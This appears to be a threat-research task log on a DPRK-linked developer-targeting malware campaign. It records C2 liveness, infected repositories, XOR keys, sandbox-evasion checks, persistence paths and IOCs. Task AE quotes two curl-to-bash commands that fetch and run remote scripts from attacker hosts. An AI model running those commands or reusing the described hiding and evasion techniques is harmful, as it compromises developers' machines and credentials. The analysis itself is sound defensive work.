- **Injection targets** (all cross-platform Win/Mac/Linux):
  - VSCode `@vscode/deviceid/dist/index.js`
  - Cursor `@vscode/deviceid/dist/index.js`
  - **Antigravity** `@vscode/deviceid/dist/index.js` ← **NEW — not in any public report**
  - Discord `discord_desktop_core/index.js`
  - GitHub Desktop `main.js`
  - **npm CLI** `node_modules/npm/lib/cli.js` ← **supply chain propagation vector**
- **Socket.io C2** — same `_H2` URL as Stage 1; 14 `ss_*` commands including `ss_eval` (arbitrary JS exec), `ss_connect:<ip>` (C2 redirect), `ss_upf`/`ss_upd` (file exfil), `ss_cb` (clipboard), `ss_exit_f` (kill)
- **Clipboard theft:** All platforms covered (PowerShell/pbpaste/xclip/xsel)
- **Sandbox detection:** Process MD5 check (`9a47bb48b7b8ca41fc138fd3372e8cc0`), env var `jsbot`, UUIDs `EV-CHQG3L42MMQ`/`EV-4A6OE6M0E2D`, hostname checks (WSL2/buildbot/github-runner/cloudchamber/root)
- **Python stage:** `Programs\Python\Python3127` on PATH before spawn (Windows); `~py`/`python3` command names trigger escalation
- **File upload:** POST to `_H2/u/f` via axios multipart form-data
- **Stage 2+3 unified:** JFrog described them as separate; in this blob they are one 77KB payload

**New IOCs:** `/0x/js?_V=` endpoint, Antigravity target paths, `9a47bb48b7b8ca41fc138fd3372e8cc0` sandbox hash, `EV-CHQG3L42MMQ`/`EV-4A6OE6M0E2D` analysis environment UUIDs

**zurichjs connection:** Stage 0 (infected config files) → Stage 1 (blockchain loader) → this Stage 2 executed on each victim's machine. The zurichjs developers who opened infected repos in VSCode had this exact payload run.

**U. C2 liveness check** — DONE (2026-06-28)

Port scan + HTTP probe of all five C2 IPs. See `ANALYSIS_C2_LIVENESS_U.md` for full detail.

| IP | Status | Notes |
|----|--------|-------|
| `166.88.54.158` | **DEAD** | Socket.io WS C2 (Dragon-Lady ref) — all ports closed |
| `166.88.134.62:443` | **LIVE** | Admin/testing Express server; `/0x/js` 200, socket.io active |
| `198.105.127.210:443` | **LIVE** | Prod Express server + MongoDB on :27017; `/0x/js` 200, socket.io active |
| `23.27.202.27:27017` | **DEAD** | MongoDB backend offline; likely migrated to 198.105.127.210 |
| `23.27.13.43` | **DEAD** | Confirmed offline — consistent with removal from Jun 25 Stage 2 |

Key new findings:
- Both live servers serve a **new Stage 2 format** tagged `/*RS260605*/` (build ~Jun 5, 2026): generator-function obfuscation (`function*` + `while`+`switch`+`with`), NOT the `Function("oTNBm2c", LZString)` wrapper seen in the blockchain copy
- `/0x/js` is the confirmed boot/payload endpoint (200 OK); `/$/boot` returns 404 (JFrog's documented path is retired)
- socket.io fully operational on both servers — Stage 3 backdoor infrastructure intact
- `198.105.127.210:27017` (MongoDB) is open — victim data store co-located with C2
- New IOC: `/*RS260605*/` Stage 2 build tag

**V. VSCode `folderOpen` task pattern scan on GitHub** — DONE (2026-06-28)

GitHub code search (`folderOpen node woff2 filename:tasks.json`) returned **143 total repos**.
After filtering defenders/fixtures: ~130 confirmed victim repos. See `ANALYSIS_VSCODE_SCAN_V.md`.

Key findings:
- Confirmed infected repos span multiple developer communities: HNG Nigeria hackathon (`hngx-org`/`hngi`/`DSC-Unilag`), Pakistan mobile devs (`SajidAfridi`, `abubakarmunir712`), Android devs (`Letalandroid` 10+ repos), etc.
- **New payload filenames**: `fa-brands-regular.woff2`, `RNSSanz-Black-2.woff2`, `globals_light.css`, `spellright.dict`
- **Actor-controlled staging repos**: BestCity cluster (`technoknol/bestcity`, `fullstackragab/bestcity`, `BestCity-v1/Demo-v1`, `AbstractFruitFactory/bestcity-demo`) — 55K+ payloads, fake company repos used as interview material
- **New campaign ID**: `10-010` (from `madeeldev/flutter-vpn`) — doesn't match `5-X-Y` format
- **lib.min.js**: 0 hits on GitHub (Dragon-Lady indicator not found via code search)
- **Related non-PolinRider clusters** sharing `folderOpen` vector: `regioncheck.xyz` (curl-to-bash), `codeviewer-three.vercel.app` (Vercel CDN) — different actor(s), different C2
- **New npm package IOC**: `jsonwebauth` (pub. 2026-01-08, 326KB payload in `lib/lserver.js`)
- Scale estimate: 200–400+ victim repos total across all delivery variants

**W. Dragon-Lady npm packages — registry check** — DONE (2026-06-28)

All 9 packages replaced with npm security holding packages on 2026-06-11. See `ANALYSIS_NPM_PACKAGES_W.md`.

Key findings:
- **All revoked same day (2026-06-11)**: coordinated npm security action, 9 GHSA advisories filed simultaneously
- **Two injection waves**: May 19 (animates-kit, animatics — likely test run) and June 7 (main batch: 5 packages with rapid multi-version deploys) + June 10 stragglers
- **~3,100+ combined downloads** = ~3,100 potentially compromised developer machines
- **`tailwindcss-merge` pre-2026 history**: v0.0.1/v0.0.2 published 2024-01-17 — possibly pre-positioned name squatting (2.5 years before weaponization), or hijacked legitimate account. Tarball purged, cannot confirm.
- **Publisher identity unknown**: npm cleared all maintainer metadata; tarballs purged from CDN
- **`typeorm-encrypt` + `rate-limit-flexible`** highest impact: target NestJS/Express backend devs with database/infrastructure access — more privileged than frontend CSS tooling victims
- GHSA IDs: GHSA-f7h6-4xj8-8qh7 (typeorm-encrypt), GHSA-m2xh-rw7p-69rx (tailwindcss-merge), GHSA-v7vx-48xw-jwm8 (rate-limit-flexible), GHSA-v4xp-qgj3-gphm (animates-kit), +5 others

**X. W3 Feb 25 batch decode — historical Stage 2** — DONE
Full analysis in `ANALYSIS_W3_HISTORICAL_X.md`. Key findings:

- **W3 XOR key rotation discovered:** Feb 25, 2026 was not a routine update — it was a live
  key rotation from `cA]2!+37v,-szeU}` → `2[gWfGj;<:-93Z^C`. The last old-key TX (18:05) and
  first new-key TX (18:07) decrypt to **identical plaintext** — same payload re-deployed 2 min apart.
- **Historical key recovered:** `cA]2!+37v,-szeU}` was in use from W3 genesis (Nov 13, 2025)
  through Feb 25 18:05. Enables decryption of all W3 payloads from that period.
- **Why 12 TXs on Feb 25:** 2 old-key TXs + 10 new-key TXs = rotation re-push of all variants.
  Same pattern as May 21 (6 TXs for UMD wrapper introduction).
- **Payload format confirmed:** All pre-May-21 W3 payloads are plain WJS shuffle cipher IIFE
  (no LZString, no Function() wrapper). Two variants: array form (`function a0c(){const hc=[...`)
  and object form (`(function(a,b){const a0d6={...`).
- **Phase 1→2 transition:** Within the Feb 11 session, payload shrank from ~92K to ~70K (25%
  reduction). The 92K phase (Nov 2025 – Feb 11 14:22) was replaced with the slimmer 70K phase
  within a single day — likely a code optimization or dead-code removal pass.
- Nov 2025 BSC TXs not recoverable (BSC archive pruned; TRON API pagination gap).

**AA. Reverse MD5 `9a47bb48b7b8ca41fc138fd3372e8cc0` — sandbox process name** — INVESTIGATED, UNRESOLVED

The exact Windows sandbox check code (from decoded Stage 2):
- Runs `tasklist /FO CSV /NH`, strips quotes from first CSV field per line
- **Only processes process names whose first character is uppercase `O`** (all others skipped with embedded anti-debug)
- MD5-hashes qualifying names; if match → silent abort (no C2 report)

Exhaustive search (2026-06-28):
- Brute-forced all `O*.exe` names 2–5 chars (covers ~30M candidates) → no match
- 300+ specific named Windows processes tested: OllyDbg, Online Armor (OAcat/OAUI/OAnet), Outpost FW, OfficeScan, OPSWAT, Okta (OktaVerify), Orbital/Cisco, Dynatrace OneAgent, Ollama, Obsidian, OmniSharp, OmniPeek, Observer Analyzer, Orbit/Fleet, OSSEC (ossec-agent), OpenVPN, Opera, OBS, OmniGraffle, etc.
- Public rainbow tables (CrackStation, hashes.com, md5decrypt.net) → no match
- Security process databases (websec/Security-Software-Process-and-Driver-Names, Mandiant CAPA rules, Checkpoint Evasions encyclopedia) → no O* match for this hash

**Conclusion:** The target process name is NOT in any public database. Most likely candidates:
1. A proprietary analysis-platform agent not publicly documented (ANY.RUN, Hatching Triage, VMRay, or vendor-internal sandbox)
2. An internal DPRK development-environment tool the actor avoids infecting
3. An obscure enterprise security product not in public AV/EDR process databases

**Key structural finding:** The `O`-only filter means this check is near-zero overhead on real developer machines (very few O* processes) while precisely targeting one known analysis environment. The actor added this after encountering that specific process.

**Next step:** Send `9a47bb48b7b8ca41fc138fd3372e8cc0` to ANY.RUN/Mandiant/ESET threat intel teams — they may be able to reverse it from internal sandbox behavioral data.

Related research: 
- ANY.RUN sandbox detection methods: https://medium.com/@orangemaster674/attacking-any-run-for-sandbox-detection-development-747c1a8aa4fd
- Mandiant CAPA rule for Windows Sandbox via `CExecSvc.exe`: github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-vm/vm-detection/check-for-windows-sandbox-via-process-name.yml

**Y. `lambda-platform/lambda` Go package — live payload check** — DONE, NOT INFECTED (2026-06-28)

See `ANALYSIS_Y_LAMBDA_GO.md` for full detail.

Key findings:
- **NOT infected.** `lambda-platform/lambda` is a real Go web framework (DB/GraphQL/gRPC
  scaffolding) with 400+ normal releases. The date correlation (v0.9.18 May 25, v0.9.19 Jun 19)
  was coincidental.
- All changes in v0.9.18 (the "injection" version): SQL injection whitelist fix, password field
  JSON masking, debug print removal — all legitimate security improvements.
- No `.vscode/tasks.json`, no `fa-solid-400.woff2`, no TRON wallets, no XOR cipher, no
  blockchain API calls anywhere in the codebase.
- **Nextron's 16 infected Go packages** are unknown — the JFrog post did not list them
  individually. They are likely fake/typosquatted packages (same pattern as infected npm packages),
  not established libraries. Cannot investigate without the specific package list.

**Z. Dragon-Lady `sources.md` review** — DONE (2026-06-28)

Read `docs/sources.md` (18KB) and `docs/advisory.md` (25KB). See `ANALYSIS_SOURCES_Z.md`.

Key new findings:
- **npm publisher confirmed: `successkeyteck`** — resolves Task W's unknown publisher; account now suspended
- **New XOR key `ThZG+0jfXE6VAGOJ`** — HTTP C2 response decryption (4th campaign key); found in SafeDep report on `astro.config.mjs` variant
- **Malicious PR attack on `Egonex-AI/Understand-Anything`** (57K+ stars) — actor account `AsimRaza10` submitted PRs #198, #206, #261 with payload in `homepage/astro.config.mjs`; same PolinRider infra; first documented PR-based delivery
- **Two additional hijacked packages**: `html-to-gutenberg@4.2.11` and `fetch-page-assets@1.2.9` (both pub 2026-05-25, removed); hijacked legitimate packages with established userbases
- **Stage 4/5 Linux persistence paths**: `/tmp/transformers.pyz`, `gh-token-monitor.service`, `pgsql-monitor.service`, `~/.local/bin/pgmonitor.py` — credential-theft service names designed to blend with developer tools
- **Separate DPRK RAT track** (OX Security): `terminal-logger-utils`, `ts-logger-pack` — different C2 (`/api/validate/keyboard-events`, Telegram Bot), not PolinRider blockchain-based
- Spawned tasks AG and AH

**AB. Deobfuscate `/*RS260605*/` Stage 2 — new generator-function format** — DONE (2026-06-28)

See `ANALYSIS_AB_RS260605_STAGE2.md` for full detail.

Key findings:
- **RS260605 Stage 2 is a pure blockchain dead-drop UPDATER** — not a standalone RAT.
  Exits silently if blockchain is empty; all RAT functionality is in Stage 3 (blockchain-delivered).
- **Full dead-drop chain confirmed** via live async instrumentation:
  1. TRON W1 `only_confirmed=true&only_from=true&limit=1` → `data[0].raw_data.contract[0].parameter.value.data` (hex BSC hash)
  2. Aptos A1 fallback → `[0].payload.function` (hex BSC hash)
  3. BSC primary: `bsc-dataseed.binance.org` / fallback: `bsc-rpc.publicnode.com` → `result.input`
  4. XOR-decrypt with `ThZG+0jfXE6VAGOJ` → eval Stage 3
- **TRON query changed**: Stage 1 used `only_to=true` (incoming); Stage 2 uses `only_from=true`
  (outgoing). Actor pushes new payloads by sending TXs FROM W1, not receiving them.
- **WJS format**: `function*vVL9lkD` generator + 401 case labels + dynamic case expressions.
  String table: 194 entries in `yUvOUI[]`; sH1QHz shuffled 91-char alphabet, VLQ base-91.
  Two accessors: `K1oFySu.DjXats` (outer, network code) + `HCRVhxw.HcqZTQp` (inner).
  Confirmed decoded strings: `yUvOUI[116]="JSON"`, `yUvOUI[117]="parse"`.
- **Build marker**: `RS260605` = June 5, 2026 (same as blockchain Beavertail build date in Task T).

**AC. BestCity actor-staging cluster — deep dive**
Task V found four repos (`technoknol/bestcity`, `fullstackragab/bestcity`, `BestCity-v1/Demo-v1`,
`AbstractFruitFactory/bestcity-demo`) that appear to be **actor-controlled fake-company repos**
used as interview material. The `technoknol/bestcity` payload is 55,985 bytes — far larger than
a typical Stage 0 (~5KB), suggesting an embedded full-stage payload rather than a blockchain
fetcher. Goals:
1. Decode the 55,985-byte WJS IIFE payload from `technoknol/bestcity` — what stage(s) is it?
   Does it contain blockchain dead-drop logic, or serve Stage 2 directly?
2. Profile the actor accounts: `technoknol`, `fullstackragab`, `BestCity-v1`, `AbstractFruitFactory`
   — creation dates, other repos, linked identities, commit authorship
3. Check if `bestcity` repos are still live and whether payload has been updated recently
4. Determine whether `fa-brands-regular.woff2` and `fa-solid-400.woff2` in the bestcity cluster
   are different campaign generations (the brands variant used simpler command syntax)
5. Cross-reference any commit emails or author names to link actor accounts

**AD. `jsonwebauth` npm package — payload analysis**
Task V surfaced `jsonwebauth` (published 2026-01-08) from Abstract Security's report.
It contains a 326KB obfuscated payload in `lib/lserver.js`. Goals:
1. Pull the package from npm registry (if still live) or npm archive
2. Identify cipher/obfuscation — is it `_$_1e42` or a different variant?
3. Extract C2 endpoints — does it beacon to our known IPs or different infrastructure?
4. Check publisher account on npm for other malicious packages
5. Determine whether this is PolinRider/ChainVeil or a separate Contagious Interview operator

**AE. `regioncheck.xyz` / Vercel cluster — separate actor investigation**
Task V found repos using `folderOpen` with curl-to-bash delivery instead of font-file payloads.
This is a distinct campaign from PolinRider, but targeting the same developer community.
- `ta3pks/Decentralized-Social`: `curl 'https://www.regioncheck.xyz/settings/mac?flag=8' | bash`
- `dmbruno/card-activity`: `curl 'https://codeviewer-three.vercel.app/task/mac?token=6df937fe9011' | sh`
- Abstract Security also documents `vscodeconfig.com` and `vscode-load.onrender.com`
Goals:
1. Check if `regioncheck.xyz` is still live — what does `/settings/mac?flag=8` return?
2. Is this the same actor as PolinRider (shared infra, shared TTP) or a copycat?
3. Check the `ta3pks` repo for additional stages — the command continues `nohup node .vsc...`
4. Enumerate additional repos in this cluster via GitHub search for `regioncheck.xyz` in tasks.json

**AG. `Egonex-AI/Understand-Anything` PR attack — exposure assessment** — DONE (2026-06-28)

See `ANALYSIS_VSCODE_AG_EGONEX.md` for full detail.

Key findings:
- **PRs not merged — Egonex-AI users safe.** PRs #198, #206, #261 all rejected; main branch clean.
  No AsimRaza10 commits in `homepage/` history. 57K-star project not compromised.
- **`AsimRaza10` cannot be enumerated** — suspended account hides all PRs from GitHub API.
  Only the three Egonex-AI PRs are publicly documented (via SafeDep report).
- **29-repo `astro.config.mjs` infection cluster discovered** — entirely new vector, not in any
  public report. All use `_$_1e42` cipher, seed `2857687`, unique per-victim campaign IDs
  (`8-xxxx` or `9-xxxx` series).
- **Delivery mechanism confirmed**: malicious code appended after `defineConfig()` closing `});`,
  hidden by ~200 whitespace chars. `createRequire(import.meta.url)` bridges ESM→CJS for require().
  Executes on ANY Astro operation (`npm run dev`, `npm run build`, `npx astro check`).
- **Lateral spread confirmed**: `devlopersabbir` and `Letalandroid` appear in BOTH Task V
  (tasks.json) and Task AG (astro.config.mjs) in DIFFERENT repos — Stage 2 malware propagates
  from compromised machine to new Astro projects the developer creates.
- **Campaign scale**: IDs up to `8-3336` and `9-1330` suggest thousands of tracked victims.
- **New YARA anchor**: payload ending `Tgw(2509);return 1358})()` is shared across ≥3 astro payloads.

New IOCs:
- `_$_1e42` in `astro.config.mjs` (29 repos confirmed)
- `createRequire(import.meta.url)` + `global[_$_1e42[0]] = require` pattern
- Campaign series `8-xxxx`, `9-xxxx` (astro.config.mjs deliveries)
- `drewroberts/website` (9-0264-2), `devlopersabbir/devlopersabbir.github.io` (8-342),
  `Letalandroid/sociem-upao` (8-1422-2), `DanteIturri` (3 repos), `JudeTejada/jude-portfolio-v3` (9-1330-1, 11,715 bytes)
- Payload ending `Tgw(2509);return 1358})()` — YARA anchor for astro variant

**AH. Decode `ThZG+0jfXE6VAGOJ` key usage — identify Stage 1 variant** — DONE (2026-06-28)

See `ANALYSIS_AH_THZG_KEY.md` for full detail.

Key findings:
- **`ThZG+0jfXE6VAGOJ` is NOT a Stage 1 key** — it is in **Stage 2** (W2 direct-HTTP channel)
- **Location**: `_$_a478[29]` (W2 Stage 2 from Task B), `_$_9b39[29]` (5-3-161 report), `[27]`
  in `_$_f5f0` Jun 25 Stage 2 (Task R) — same key across all W2 Stage 2 variants
- **Function**: XOR-decrypts the HTTP response body from C2 at `/$/boot` to get Stage 3 (socket.io
  backdoor). Stage 2 beacons with `Sec-V: <campaign_id>` header; response is XOR'd in transit.
- **SafeDep terminology reconciled**: SafeDep's "Stage 1 variant using ThZG" = our Stage 2 (W2
  direct-HTTP beacon). They described two XOR ops in "Stage 1": `2[gWfGj` (our Stage 1 → blockchain)
  and `ThZG` (our Stage 2 → C2 HTTP). These are two different payloads, not one.
- **NOT in astro Stage 1**: Full decode of `drewroberts/website` IIFE confirmed — only `2[gWfGj`
  (W1) and `m6:tTh` (W2) present. No direct HTTP C2 step in astro Stage 1.
- **Still in use**: Key present unchanged in Jun 25 W2 Stage 2 (`_$_f5f0`, Task R).

Side-effect: Full decode of astro.config.mjs Stage 1 (`pYd`) revealed:
- Same `_$af163278` cipher (seed 1812138) as Task O — infrastructure continuity confirmed
- W1 Stage 2 eval()'d in-process; W2 Stage 2 spawned as detached windowless child (`node -e`)
- `global['_V'] = 'A' + global['!']` prefix logic confirmed — e.g. 'A9-0264-2'
- 'A8-xxxx'/'A9-xxxx' IDs route to dead C2 (`23.27.13.43`) or silent drop — astro victims
  are NOT currently being exfiltrated to a live C2
- `"?.?"` anti-debug check is dead code (function === string always false — obfuscation only)

**AI. astro.config.mjs cluster — full campaign ID map + infection dates** — DONE (2026-06-28)

See `ANALYSIS_ASTRO_CLUSTER_AI.md` for full detail.

Key findings:
- **27 of 29 repos confirmed** (2 had astro.config.mjs in non-root paths)
- **Highest campaign ID: `9-7226`** (FieteLab, May 2026) → 7,226+ victims in series 9 alone
- **Combined scale: 11,000+ tracked victims** across series 8 (4,081+) and 9 (7,226+)
- **Sleeper pre-positioning**: 7 repos have pre-June-2025 commit dates (earliest: `iSebasC/Astro`
  Jan 2023). All contain IDENTICAL Stage 1 body pointing to TRON W1/W2 wallets inactive until
  June 2025. Actor pre-seeded dormant infections for 2+ years before activating C2.
  **True operation start: at least January 2023** (not June 2025 as previously estimated).
- **Copy-paste propagation**: `Focus158/school-landing` has byte-for-byte identical payload to
  `iSebasC/Astro` (same campaign ID `8-1821-1`) — developer unknowingly copied infected template.
  `DanteIturri` 3 repos all share `8-3336`.
- **Double infections**: `rajat22999/noa-feed` (IDs `9-1435-7` + `8-2895`) and
  `JudeTejada/jude-portfolio-v3` (IDs `9-1330-1` + `8`) each have 2 stacked IIFEs — infected twice.
- **Oldest ID format**: bare `10` (sudais-khan12, ~2022-2023) and bare `8` (JudeTejada second
  IIFE) predate `X-NNNN[-Y]` scheme — pre-2023 test era numbering.
- **No same-repo multi-vector**: tasks.json and astro infections always in different repos.
- Spawned Task AK: `Rafijohari18/astro-speed` (13,696B single IIFE) anomaly investigation.

**AJ. Decode `JudeTejada/jude-portfolio-v3` astro payload (11,715 bytes)** — SUPERSEDED BY AI
The double-IIFE structure explains the size: two stacked infections (IDs `9-1330-1` + `8`).
The bare `8` ID is the pre-2023 era format — second infection from an old template source.
No additional analysis needed beyond what Task AI found.

**AK. `Rafijohari18/astro-speed` deep dive — 13,696-byte anomaly** — DONE (2026-06-28)

See `ANALYSIS_AK_RAFI.md` for full detail.

Key findings:
- **Not extreme whitespace — double infection.** Task AI's initial count of "one IIFE" missed
  a second payload hidden 1,689 bytes after the first IIFE end marker.
- **File structure**: 832B Astro config + 4,782B IIFE-1 (sfL, `8-4081`) + 1,689B whitespace gap
  + 6,393B `eval(atob('...'))` IIFE-2 (`11-#`) = 13,696B total.
- **IIFE-2 uses `eval(atob(...))` encoding** — base64 wrapping of the same sfL IIFE structure.
  This is harder to detect (base64 blob invisible in static scan). Same technique as saif72437.
- **`11-#` is a canonical template ID** — same `11-#` seen in Task N (saif72437 inner atob layer).
  Rafijohari IIFE-2 decoded size (4,781B) exactly matches saif72437 inner layer. Identical pYd_enc.
  `11-#` is NOT a victim-specific ID — it's embedded permanently in the atob dropper variant.
- **Victim real ID is `8-4081`** (IIFE-1); both channels route to dead/silent C2.
- **Third double-infected repo** in the cluster (after rajat22999 and JudeTejada from Task AI),
  but the only one using the atob dropper variant alongside a standard sfL IIFE.

**AL. Deobfuscate 2023-era astro payload — human-readable malicious logic**
The `astro.config.mjs` cluster (Task AI/AG) contains infections dating back to January 2023
(`iSebasC/Astro`, campaign ID `8-1821-1`). These are the actor's earliest known pre-positioning
artifacts — 2+ years dormant before activation.

Goals:
1. Take one of the 2023-era `8-xxxx` payloads (e.g., `iSebasC/Astro` or `Focus158/school-landing`)
2. Run the sfL shuffle cipher decoder on the `pYd_enc` IIFE to recover the inner Stage 1 plaintext
3. Produce a human-readable pseudocode or annotated deobfuscation of the 2023-era code
4. Compare to the Jun 2025 Task AH decode (`drewroberts/website` 9-0264-2):
   - Is the TRON wallet the same W1?
   - Is the Aptos fallback already present in 2023?
   - Were the XOR keys `2[gWfGj;<:-93Z^C` / `m6:tTh^D)cBz?NM]` used from day 1?
   - Is the BSC dead-drop chain identical?
5. Identify what was already in place in 2023 vs what was added in 2025 activation

This documents the full 2-year timeline of the actor's pre-positioning operation.

**AF. Campaign ID `10-010` — routing and operator identification**
`madeeldev/flutter-vpn` has `global['!']='10-010'` — a numeric-with-hyphen campaign ID that
doesn't match the `5-X-Y` or `A-...` patterns of known campaigns. The Stage 2 routing in
`_$_b229` sends numeric IDs to `198.105.127.210/$/boot`. Goals:
1. Confirm how `10-010` routes in the current Stage 2 — does the `10` prefix match any routing
   branch, or is it handled as a numeric ID?
2. Search for other repos with `10-0` prefix campaign IDs — is this a separate operator batch?
3. Check whether `madeeldev` is a single targeted developer or part of a larger cluster

**L. Investigate bat-file victim repos** — DONE
Full analysis in `ANALYSIS_BAT_VICTIMS.md`. 29 repos scanned (8 config.bat + 21 temp_interactive).
7 live infections found, all `_$_1e42` cipher with NEW activation/return pair **2509/1358**
(previously undocumented). Hit rate ~24% (7/29 sampled). Extrapolated ~22 live infections
across all 110 bat-file repos. Notable: `cto-varun` (CTO-level developer),
`dryhurstdigital/invoice-my-clients-cursor-plugin` (Cursor IDE plugin with bat file, no JS
payload in standard paths — unconventional target). All 7 payloads YARA-detectable via OSM's
existing `rmcej_otb_payload` rule but unpatched months later.
